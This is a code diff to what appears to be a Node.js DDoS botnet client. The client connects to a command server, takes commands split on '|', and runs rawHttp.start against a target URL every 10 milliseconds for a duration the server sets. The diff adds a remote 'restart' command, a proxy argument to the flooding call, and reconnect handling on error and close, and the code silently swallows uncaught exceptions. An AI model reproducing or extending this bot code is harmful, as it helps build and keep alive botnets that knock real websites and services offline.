@@ -11,7 +11,7 @@ module.exports.run = (async function (){
     const get = require('simple-get')
 
     process.on('uncaughtException', function (err) {
-        
+    
       });
 
     function sleep(ms) {
@@ -28,13 +28,16 @@ module.exports.run = (async function (){
           console.log('Connected to the Server');
           client.write(ServerName);
       });
-
       
       client.on('data', async function(data) {
           data = data.toString();
           if(data.split('|')[0] === undefined) return;
           data = data.split('|');
           let option = data[0];
+          if(option === "restart")
+          {
+            process.exit(1);
+          }
           if(option === "update")
           {
               console.log("updating")
@@ -68,17 +71,33 @@ module.exports.run = (async function (){
                   setTimeout(() => {
                       running = false;
                   }, Time);
+                  
                   var interval = setInterval(() => {
-                      if(!running) clearInterval(interval)
-                      rawHttp.start(URL_IP)
+                      if(!running) clearInterval(interval);
+                      let proxy = "";
+                      rawHttp.start(URL_IP, proxy)
                   }, 10);
               }
           }
       });
-
+      let ranNew = false;
       client.on('error', function(data) {
-          mainServer.run();
+        if(!ranNew)
+        {
+            ranNew = true;
+            mainServer.run();
+            return;
+        }
       });
+
+      client.on('close', function(data) {
+        if(!ranNew)
+        {
+            ranNew = true;
+            mainServer.run();
+            return;
+        }
+    });
 
 
 
